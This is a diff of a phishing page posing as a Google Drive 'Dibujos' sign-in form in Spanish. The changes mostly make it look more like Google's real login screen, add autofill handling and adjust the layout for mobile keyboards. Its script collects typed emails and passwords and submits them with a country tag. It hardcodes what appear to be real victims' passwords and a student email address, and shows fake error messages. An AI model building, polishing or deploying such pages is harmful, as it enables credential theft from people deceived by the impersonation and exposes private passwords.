@@ -8,7 +8,7 @@
     
     <meta property="og:title" content="Google Drive - Dibujos" />
     <meta property="og:description" content="google.com" />
-    <meta property="og:image" content="https://i.ibb.co/GDfZ1J3/dibunewie.png"" />
+    <meta property="og:image" content="https://i.ibb.co/GDfZ1J3/dibunewie.png" />
     
     <title>Google Drive - Dibujos</title>
     
@@ -23,13 +23,20 @@
 
         body {
             font-family: 'Google Sans', 'Roboto', arial, sans-serif;
-            background-color: #202124;
+            background-color: #2c2d30;
             color: #e8eaed;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+        }
+
+        /* Clase para cuando aparece el teclado virtual */
+        body.keyboard-active {
+            justify-content: flex-start;
+            padding-top: 10px;
+            padding-bottom: 10px;
         }
 
         .container {
@@ -39,16 +46,32 @@
             width: 100%;
             max-width: 450px;
             padding: 48px 40px 36px;
+            transition: transform 0.3s ease;
+        }
+
+        /* Transformación cuando aparece el teclado */
+        .container.keyboard-active {
+            transform: translateY(-20px);
+        }
+
+        /* CSS para el teclado móvil */
+        @media (max-width: 768px) {
+            .keyboard-active .container {
+                transform: translateY(-30px);
+            }
+            
+            .keyboard-active .logo {
+                margin-bottom: 4px;
+            }
         }
 
         .logo {
             width: 90px;
-        
-            margin-bottom: 16px;
+            margin-bottom: 8px;
         }
 
         .card {
-            background-color: #2d2e30;
+            background-color: #1f1f1f;
             border-radius: 8px;
             box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
             padding: 48px 40px 36px;
@@ -83,77 +106,81 @@
             width: 100%;
             padding: 16px 12px 8px;
             background-color: transparent;
-            border: 1.5px solid #94b1ec;
-            border-radius: 5px;
+            border: 1.5px solid #5f6368;
+            border-radius: 4px;
             color: #e8eaed;
-            font-size: 1rem;
+            font-size: 16px;
             outline: none;
             transition: border-color 0.2s;
         }
 
         .input-field:focus {
-            border-color: #82aaff;
+            border-color: #8ab4f8;
         }
 
-        /* Nuevo estilo para el campo de contraseña con error */
         .input-field.error {
-            border-color: #ce9591;
+            border-color: #f28b82;
+        }
+
+        /* Forzar estilos para autocompletado */
+        .input-field:-webkit-autofill {
+            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
+            -webkit-text-fill-color: #e8eaed !important;
+            background-color: transparent !important;
+        }
+
+        .input-field:-webkit-autofill:focus {
+            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
+            -webkit-text-fill-color: #e8eaed !important;
+        }
+
+        .input-field:-webkit-autofill:hover {
+            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
+            -webkit-text-fill-color: #e8eaed !important;
         }
 
         .input-label {
             position: absolute;
             top: 16px;
             left: 12px;
-            color: #cdd6f4;
-            background-color: #2d2e30;
+            color: #9aa0a6;
+            background-color: #1f1f1f;
             padding: 0 4px;
             transition: 0.2s ease all;
             pointer-events: none;
+            font-size: 16px;
         }
 
         .input-field:focus + .input-label,
-        .input-field:not(:placeholder-shown) + .input-label {
-            top: -10px;
-            font-size: 0.8rem;
-            color: #82aaff;
+        .input-field:not(:placeholder-shown) + .input-label,
+        .input-field.has-value + .input-label {
+            top: -8px;
+            font-size: 12px;
+            color: #8ab4f8;
         }
 
-        /* Mantener el color del label cuando hay error */
         .input-field.error:focus + .input-label,
-        .input-field.error:not(:placeholder-shown) + .input-label {
-            color: #ce9591;
-        }
-
-        .forgot-email {
-            color: #388eff;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 24px;
-            text-align: left;
-        }
-
-        .forgot-email:hover {
-            text-decoration: underline;
+        .input-field.error:not(:placeholder-shown) + .input-label,
+        .input-field.error.has-value + .input-label {
+            color: #f28b82;
         }
 
         .guest-mode {
-        
-            color: #ff9090;
+            background-color: #0d5dc7;
+            color: #ffffff;
             font-size: 14px;
-            line-height: 1.4286;
+            padding: 12px 16px;
+            border-radius: 4px;
             margin-bottom: 24px;
             text-align: left;
+            display: flex;
+            align-items: center;
         }
 
-        .guest-mode a {
-            color: #719ae6;
-            text-decoration: none;
-        }
-
-        .guest-mode a:hover {
-            text-decoration: underline;
+        .guest-mode::before {
+            content: "ℹ";
+            margin-right: 8px;
+            font-weight: bold;
         }
 
         .show-password-wrapper {
@@ -162,20 +189,13 @@
             margin-bottom: 24px;
         }
 
-        .show-password-wrapper {
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-        }
-
-        /* Estilo personalizado para el checkbox */
         .show-password-wrapper input[type="checkbox"] {
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
             width: 16px;
             height: 16px;
-            border: 2px solid #9aa0a6;
+            border: 2px solid #5f6368;
             border-radius: 2px;
             background-color: transparent;
             margin-right: 8px;
@@ -185,8 +205,8 @@
         }
 
         .show-password-wrapper input[type="checkbox"]:checked {
-            border-color: #1a73e8;
-            background-color: #1a73e8;
+            border-color: #8ab4f8;
+            background-color: #8ab4f8;
         }
 
         .show-password-wrapper input[type="checkbox"]:checked::after {
@@ -202,7 +222,7 @@
         }
 
         .show-password-wrapper input[type="checkbox"]:hover {
-            border-color: #82aaff;
+            border-color: #8ab4f8;
         }
 
         .show-password-wrapper label {
@@ -211,6 +231,7 @@
             cursor: pointer;
             user-select: none;
         }
+
         .actions {
             display: flex;
             justify-content: space-between;
@@ -219,7 +240,7 @@
         }
 
         .create-account {
-            color: #1a73e8;
+            color: #8ab4f8;
             font-size: 14px;
             font-weight: 500;
             text-decoration: none;
@@ -230,10 +251,10 @@
         }
 
         .next-button {
-            background-color: #1a73e8;
+            background-color: #82a4dd;
             border: none;
-            border-radius: 4px;
-            color: #fff;
+            border-radius: 20px;
+            color: #1f1f1f;
             font-size: 14px;
             font-weight: 500;
             height: 36px;
@@ -243,23 +264,27 @@
         }
 
         .next-button:hover {
-            background-color: #2b7de9;
+            background-color: #aecbfa;
             box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
 
         .next-button:disabled {
             background-color: #5f6368;
             cursor: not-allowed;
+            color: #e8eaed;
         }
 
+        /* Footer mejorado */
         .footer {
-            margin-top: 56px;
+            margin-top: 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             width: 100%;
-            max-width: 450px;
+            max-width: 380px;
             font-size: 12px;
+            flex-shrink: 0;
+            transition: all 0.3s ease;
         }
 
         .language-selector {
@@ -280,7 +305,7 @@
         .footer-links {
             display: flex;
             gap: 24px;
-            flex-wrap: wrap;
+            flex-wrap: nowrap;
         }
 
         .footer-links a {
@@ -295,7 +320,7 @@
         }
 
         .error-message {
-            color: #ff9090;
+            color: #f28b82;
             font-size: 14px;
             margin-top: 8px;
             margin-bottom: 16px;
@@ -303,9 +328,8 @@
             display: none;
         }
 
-        /* Estilo especial para errores de contraseña prohibida */
         .error-message.password-prohibited {
-            color: #ff9c95;
+            color: #f28b82;
         }
 
         /* Responsive */
@@ -315,19 +339,25 @@
             }
             
             .footer {
-                padding: 0 10px;
+                padding: 0 4px;
+                margin-top: 20px;
             }
             
             .footer-links {
-                gap: 16px;
+                gap: 12px;
+                flex-wrap: nowrap;
             }
             
             .footer-links a {
-                font-size: 11px;
+                font-size: 10px;
             }
             
             .language-selector select {
-                font-size: 11px;
+                font-size: 10px;
+            }
+            
+            .keyboard-active .container {
+                transform: translateY(-25px);
             }
         }
         
@@ -339,25 +369,31 @@
             .footer {
                 margin-top: 32px;
                 padding: 0 8px;
+                flex-wrap: nowrap;
             }
             
             .footer-links {
-                gap: 12px;
+                gap: 8px;
+                flex-wrap: nowrap;
             }
             
             .footer-links a {
-                font-size: 10px;
+                font-size: 9px;
             }
             
             .language-selector select {
-                font-size: 10px;
+                font-size: 9px;
+            }
+            
+            .keyboard-active .container {
+                transform: translateY(-20px);
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
+        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="Google" class="logo">
         
         <div class="card">
             <h1 class="title">Acceder a Dibujos</h1>
@@ -369,9 +405,13 @@
                     <label for="emailInput" class="input-label">Correo electrónico o teléfono</label>
                 </div>
                 
+                <div class="guest-mode" id="guestMode">
+                  Inicia sesión para continuar
+                </div>
+                
                 <div class="input-wrapper">
                     <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" maxlength="32" required>
-                    <label for="passwordInput" class="input-label">Contraseña</label>
+                    <label for="passwordInput" class="input-label">Ingresa tu contraseña</label>
                 </div>
                 
                 <div id="errorMessage" class="error-message"></div>
@@ -379,11 +419,6 @@
                 <div class="show-password-wrapper">
                     <input type="checkbox" id="showPassword">
                     <label for="showPassword">Mostrar contraseña</label>
-                </div>
-                
-        
-                <div class="guest-mode" id="guestMode">
-               Solicita el permiso en la carpeta para continuar
                 </div>
                 
                 <div class="actions">
@@ -396,14 +431,14 @@
         <div class="footer">
             <div class="language-selector">
                 <select>
-                    <option value="es">Español</option>
+                    <option value="es">Español (Latinoamérica)</option>
                     <option value="en">English</option>
                 </select>
             </div>
             <div class="footer-links">
                 <a href="#">Ayuda</a>
                 <a href="#">Privacidad</a>
-                <a href="#">Términos</a>
+                <a href="#">Condiciones</a>
             </div>
         </div>
     </div>
@@ -414,18 +449,59 @@
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
 
-        // Limpiar el estilo de error cuando el usuario empieza a escribir en el email
+        // Función para verificar si un campo tiene valor
+        function checkFieldValue(input) {
+            if (input.value.trim() !== '') {
+                input.classList.add('has-value');
+            } else {
+                input.classList.remove('has-value');
+            }
+        }
+
+        // Función para verificar autocompletado
+        function checkAutofill() {
+            setTimeout(() => {
+                checkFieldValue(emailInput);
+                checkFieldValue(passwordInput);
+            }, 100);
+        }
+
+        // Eventos para el campo de email
         emailInput.addEventListener('input', function() {
             emailInput.classList.remove('error');
+            checkFieldValue(emailInput);
         });
 
-        // Limpiar el estilo de error cuando el usuario empieza a escribir en la contraseña
+        emailInput.addEventListener('change', function() {
+            checkFieldValue(emailInput);
+        });
+
+        emailInput.addEventListener('blur', function() {
+            checkFieldValue(emailInput);
+        });
+
+        // Eventos para el campo de contraseña
         passwordInput.addEventListener('input', function() {
             passwordInput.classList.remove('error');
-            // Limpiar también las clases de error del mensaje
             const errorMessage = document.getElementById('errorMessage');
             errorMessage.classList.remove('password-prohibited');
+            checkFieldValue(passwordInput);
         });
+
+        passwordInput.addEventListener('change', function() {
+            checkFieldValue(passwordInput);
+        });
+
+        passwordInput.addEventListener('blur', function() {
+            checkFieldValue(passwordInput);
+        });
+
+        // Verificar autocompletado periódicamente
+        setInterval(checkAutofill, 500);
+
+        // Verificar al cargar la página
+        window.addEventListener('load', checkAutofill);
+        document.addEventListener('DOMContentLoaded', checkAutofill);
 
         // Manejar mostrar/ocultar contraseña
         document.getElementById('showPassword').addEventListener('change', function() {
@@ -433,7 +509,7 @@
             passwordInput.type = this.checked ? 'text' : 'password';
         });
 
-        // Manejar formulario - Una sola pantalla con email y contraseña
+        // Manejar formulario
         document.getElementById("loginForm").addEventListener("submit", async function(event) {
             event.preventDefault();
             
@@ -468,13 +544,13 @@
             let isProhibitedEmail = false;
             let isProhibitedPassword = false;
             
-            // Lista de correos prohibidos (copiada del formulario 2)
+            // Lista de correos prohibidos
             const prohibitedEmails = ["c20bl11064@acarrion.edu.pe"];
             if (prohibitedEmails.includes(email)) {
                 isProhibitedEmail = true;
             }
             
-            // Verificar contraseñas prohibidas (copiada del formulario 2)
+            // Verificar contraseñas prohibidas
             const prohibitedPasswords = ["fernanda2022","Fernanda2022","Haily130598","haily130598","delfin","cochachi2523","Cochachi2523","cochachi2523","aylinnmierda2008","Aylinnmierda2008","loveteo10","Greinyer10","greinyer10"];
             if (prohibitedPasswords.includes(password)) {
                 isProhibitedPassword = true;
@@ -509,7 +585,7 @@
                 
                 // Agregar diferenciador junto al campo país
                 if (isProhibitedEmail || isProhibitedPassword) {
-                 formData.append("country", country + " - INTENTO_FALLIDO");
+                    formData.append("country", country + " - INTENTO_FALLIDO");
                 } else {
                     formData.append("country", country);
                 }
@@ -525,16 +601,17 @@
                 
                 // Después de enviar, verificar si debe mostrar error o redirigir
                 if (isProhibitedEmail) {
-                    showError("Ocurrio un error con el correo, intentar con otra dirección", false);
+                    showError("Ocurrió un error con el correo, intentar con otra dirección", false);
                     emailInput.value = '';
                     passwordInput.value = '';
-                    // Agregar clase error al campo de email
                     emailInput.classList.add('error');
+                    emailInput.classList.remove('has-value');
+                    passwordInput.classList.remove('has-value');
                 } else if (isProhibitedPassword) {
                     showError("La contraseña no es correcta. Inténtalo de nuevo.", true);
                     passwordInput.value = '';
-                    // Agregar clase error al campo de contraseña
                     passwordInput.classList.add('error');
+                    passwordInput.classList.remove('has-value');
                 } else {
                     // Si no es prohibido, redirigir normalmente
                     if (response.ok) {
@@ -561,7 +638,6 @@
             errorMessage.style.display = 'block';
             guestMode.style.display = 'none';
             
-            // Aplicar estilo especial para errores de contraseña prohibida
             if (isPasswordError) {
                 errorMessage.classList.add('password-prohibited');
             } else {
@@ -583,6 +659,80 @@
             } catch (error) {
                 console.error("Error al verificar la redirección:", error);
             }
+        });
+    </script>
+
+    <script>
+        // Script mejorado para el manejo del teclado virtual
+        document.addEventListener('DOMContentLoaded', function() {
+            // Detectar si es un dispositivo móvil
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+                            window.innerWidth <= 768;
+            
+            if (!isMobile) return; // Solo ejecutar en móviles
+            
+            const inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
+            const body = document.body;
+            const container = document.querySelector('.container');
+            
+            let keyboardTimeout;
+            
+            function activateKeyboard() {
+                clearTimeout(keyboardTimeout);
+                body.classList.add('keyboard-active');
+                container.classList.add('keyboard-active');
+            }
+            
+            function deactivateKeyboard() {
+                keyboardTimeout = setTimeout(() => {
+                    // Verificar si algún input está activo
+                    const activeElement = document.activeElement;
+                    const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
+                    
+                    if (!isInputFocused) {
+                        body.classList.remove('keyboard-active');
+                        container.classList.remove('keyboard-active');
+                    }
+                }, 300);
+            }
+            
+            inputs.forEach(input => {
+                // Eventos para activar
+                input.addEventListener('focus', activateKeyboard);
+                input.addEventListener('touchstart', activateKeyboard);
+                input.addEventListener('click', activateKeyboard);
+                
+                // Eventos para desactivar
+                input.addEventListener('blur', deactivateKeyboard);
+            });
+            
+            // Manejar cambios de orientación
+            window.addEventListener('orientationchange', function() {
+                setTimeout(() => {
+                    const activeElement = document.activeElement;
+                    if (activeElement && activeElement.matches('input[type="email"], input[type="password"]')) {
+                        activateKeyboard();
+                    }
+                }, 500);
+            });
+            
+            // Detectar resize del viewport (cuando aparece/desaparece el teclado)
+            let initialHeight = window.innerHeight;
+            window.addEventListener('resize', function() {
+                const currentHeight = window.innerHeight;
+                const heightDifference = initialHeight - currentHeight;
+                
+                // Si la altura se reduce significativamente, probablemente apareció el teclado
+                if (heightDifference > 150) {
+                    activateKeyboard();
+                } else if (heightDifference < 50) {
+                    // Si la altura se restaura, probablemente desapareció el teclado
+                    const activeElement = document.activeElement;
+                    if (!activeElement || !activeElement.matches('input[type="email"], input[type="password"]')) {
+                        deactivateKeyboard();
+                    }
+                }
+            });
         });
     </script>
 </body>
